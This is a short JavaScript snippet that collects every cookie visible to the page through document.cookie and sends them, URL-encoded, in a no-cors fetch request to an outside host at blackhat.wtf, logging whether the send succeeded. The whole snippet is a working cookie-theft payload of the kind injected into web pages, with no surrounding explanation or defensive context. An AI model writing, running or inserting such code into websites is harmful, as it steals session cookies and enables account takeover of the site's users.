// Fetch all cookies from the browser
const cookies = document.cookie;

// Check if there are cookies to send
if (cookies) {
  // Build the URL with all cookies appended
  const url = `https://blackhat.wtf/hacked?cookie=${encodeURIComponent(cookies)}`;
  
  // Send the cookies to the URL
  fetch(url, { method: 'GET', mode: 'no-cors' })
    .then(() => console.log('Cookies sent successfully'))
    .catch((error) => console.error('Error sending cookies:', error));
} else {
  console.warn('No cookies found');
}
